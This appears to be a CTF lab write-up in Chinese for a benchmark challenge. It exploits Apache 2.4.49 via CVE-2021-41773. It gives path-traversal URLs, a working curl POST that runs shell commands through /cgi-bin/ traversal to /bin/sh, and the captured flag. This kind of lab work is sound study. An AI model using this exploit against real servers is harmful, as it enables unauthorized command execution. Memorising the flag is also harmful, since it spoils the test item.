# xben-031-24 · 探索记录

对应题解：[`xben-031-24.md`](./xben-031-24.md)

## 目标与起点

容器 `10.0.173.136:80`，响应头：

```text
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
```

首页是 Apache 默认页 `<h1>It works!</h1>`。

**2.4.49 = CVE-2021-41773 的原生受影响版本**（路径穿越 + `mod_cgi` RCE）。

## 第一阶段：`.%2e` 穿越（根路径 403）

| 路径 | 结果 |
| --- | --- |
| `/.%2e/.%2e/.%2e/.%2e/etc/passwd` | **403** |
| `/.%2e/.%2e/.%2e/.%2e/FLAG.txt` | 403 |
| `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` | **500** |
| `/cgi-bin/.%2e/.%2e/.%2e/.%2e/FLAG.txt` | 404 |

判读：

- 根路径 403 → 该目录没有 `Require all granted`，穿越被拒；
- `/cgi-bin/` 出发是 500 → **已经进到文件系统/CGI 处理阶段**，只是目标不对；
- `/FLAG.txt` 404 → 该路径不存在（flag 不在根）。

## 第二阶段：确定穿越层数

`/cgi-bin/` 在根下第一层，所以 4 个 `.%2e` 到 `/`：

| 路径 | 结果 |
| --- | --- |
| `/cgi-bin/.%2e/.%2e/bin/sh`（2 层） | 404 |
| `/cgi-bin/.%2e/.%2e/.%2e/bin/sh`（3 层） | 404（到 `/usr`，没有 `/usr/bin/sh`） |
| **`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`（4 层）** | **200，命令执行** |

## 第三阶段：POST 命令

```bash
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'echo Content-Type: text/plain; echo; id' \
  'http://$T/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## 第四阶段：定位 flag

```bash
rce 'ls -la /'                      # 根目录没有 flag 文件
rce 'find / -maxdepth 3 -iname "*flag*" 2>/dev/null'
# /proc/kpageflags
# /tmp/flag
rce 'cat /tmp/flag'
# flag{8989d370-8843-4a12-ad26-97ab35e1391f}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 根路径 `/.%2e/...` 读 `/etc/passwd` | 403 | 根目录不允许访问，不是"漏洞无效" |
| `/cgi-bin/.../FLAG.txt` | 404 | 根下没有该文件 |
| 2 层 / 3 层穿越到 `bin/sh` | 404 | 层数不够，落在 `/usr` 等目录 |
| `cat /FLAG.txt`、`cat /flag`、`cat /flag.txt` | 空 | flag 实际在 `/tmp/flag` |

## 这次真正的收获

1. **`Server:` 版本号先对 CVE。** 2.4.49/2.4.50 直接对应 CVE-2021-41773/42013，
   不用先盲试一堆 payload。
2. **403 只说明"这个目录被限制"，不说明"漏洞不可用"。** 换一个有权限的目录
   （`/cgi-bin/`）作为起点，穿越一样成立。
3. **穿越层数 = 起点目录到根的深度。** 4 层到 `/`、3 层到 `/usr`；
   层数不对就是 404，层数对了但目标不可执行是 500。**先把 500 与 404 分开读**，
   能省掉大量试错。
4. **拿到命令执行后先 `find` 而不是逐个 `cat`。** 这题的 flag 在 `/tmp/flag`，
   前几次 `cat /flag`、`cat /FLAG.txt` 全空，`find / -iname '*flag*'` 一次定位。
